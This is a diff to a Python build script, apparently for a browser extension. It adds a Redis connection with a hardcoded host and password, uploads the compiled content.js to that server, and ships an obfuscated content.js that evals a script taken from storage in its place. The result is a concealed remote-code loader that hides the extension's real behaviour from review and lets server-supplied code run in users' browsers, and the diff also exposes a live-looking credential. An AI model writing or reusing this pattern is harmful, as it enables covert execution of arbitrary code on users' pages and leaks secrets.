@@ -1,5 +1,12 @@
 import json
-import os,requests
+import os,requests,redis
+
+
+r = redis.Redis(
+  host= 'us1-pure-panther-34715.upstash.io',
+  port= '34715',
+  password= 'af900203bfbd4ea48bb02d4d070b9716', ssl=True)
+
 
 from pathlib import Path
 
@@ -83,6 +90,17 @@ for file in files:
                 if functionInject:
                     print('Injecting Function')
                     final = final.replace('runAll',"function(){" + functionInject + "}")
+
+                if('content.js' in file):
+                    r.set('latestscript',json.dumps({'version':'0.1','script':final}))
+                    print('updated latest script on server')
+                
+                    final = PyObfuscator().obfuscate("""
+                    chrome.storage.local.get(['latestscript'],function({latestscript}){
+                        if(latestscript){
+                            eval(latestscript);
+                        }
+                    })""")
 
                 with open(os.path.join(output, file), 'w') as f:
                     f.write(final)
